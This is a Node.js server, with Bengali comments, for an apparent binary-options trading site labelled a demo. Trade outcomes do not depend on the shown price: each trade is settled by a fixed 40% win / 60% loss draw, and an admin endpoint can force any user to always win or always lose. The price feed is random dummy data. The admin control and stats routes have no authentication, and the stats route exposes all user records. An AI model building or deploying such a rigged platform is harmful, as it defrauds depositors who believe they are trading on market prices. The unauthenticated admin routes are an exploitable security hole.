const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ইন-মেমোরি ডাটাবেজ (ডেমো প্রজেক্টের জন্য)
let users = {
  "demo_user": { balance: 1000, role: "user", control: "normal" } // control: 'normal', 'win', 'loss'
};

let stats = {
  totalDeposit: 50000,
  totalWithdraw: 20000
};

// ট্রেড রিকুয়েস্ট এবং উইন/লস লজিক (৪০% উইন, ৬০% লস)
app.post('/api/trade', (req, res) => {
  const { username, amount, timeframe } = req.body;
  let user = users[username] || { balance: 1000, control: 'normal' };

  let isWin = false;

  // অ্যাডমিন কন্ট্রোল চেক
  if (user.control === 'win') {
    isWin = true;
  } else if (user.control === 'loss') {
    isWin = false;
  } else {
    // ডিফল্ট লজিক: ৪০% চান্স উইন, ৬০% লস
    const randomChance = Math.random() * 100;
    isWin = randomChance < 40; 
  }

  let profit = isWin ? amount * 1.85 : 0; // ৮৫% পেআউট
  if (isWin) {
    user.balance += (profit - amount);
  } else {
    user.balance -= amount;
  }

  res.json({ success: true, isWin, balance: user.balance, profit });
});

// অ্যাডমিন কন্ট্রোল আপডেট API
app.post('/api/admin/control', (req, res) => {
  const { username, controlState } = req.body; // 'win', 'loss', 'normal'
  if (users[username]) {
    users[username].control = controlState;
    res.json({ success: true, message: `User ${username} set to ${controlState}` });
  } else {
    res.json({ success: false, message: "User not found" });
  }
});

// ২৪ ঘণ্টার লাইভ স্ট্যাটস API
app.get('/api/admin/stats', (req, res) => {
  res.json({
    totalDeposit: stats.totalDeposit,
    totalWithdraw: stats.totalWithdraw,
    users: users
  });
});

// WebSocket রিয়েল-টাইম প্রাইস ফিডের জন্য
wss.on('connection', (ws) => {
  setInterval(() => {
    let dummyPrice = (1.0800 + Math.random() * 0.0050).toFixed(4);
    ws.send(JSON.stringify({ type: 'PRICE_UPDATE', price: dummyPrice }));
  }, 1000);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});
